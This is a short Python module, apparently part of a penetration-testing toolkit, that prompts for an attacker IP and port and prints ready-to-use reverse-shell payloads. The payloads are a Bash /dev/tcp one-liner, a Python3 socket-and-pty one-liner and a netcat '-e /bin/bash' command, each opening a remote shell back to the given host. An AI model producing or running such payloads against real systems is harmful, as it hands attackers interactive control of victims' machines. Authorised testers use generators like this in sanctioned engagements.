from rich.console import Console
from rich.syntax import Syntax
from core.ui import draw_header

console = Console()


def generate_shell():
    draw_header("Shell Forge")
    lhost = console.input("[bold yellow]LHOST (Your IP): [/bold yellow]")
    lport = console.input("[bold yellow]LPORT: [/bold yellow]")

    if not lhost or not lport:
        return

    shells = {
        "Bash Reverse": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Python3": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "Netcat": f"nc -e /bin/bash {lhost} {lport}"
    }

    console.print(
        f"\n[bold green]Generated Payloads for {lhost}:{lport}[/bold green]")
    for name, code in shells.items():
        console.print(f"\n[bold cyan]--- {name} ---[/bold cyan]")
        console.print(Syntax(code, "bash", theme="monokai", word_wrap=True))

    input("\nPress Enter to return...")
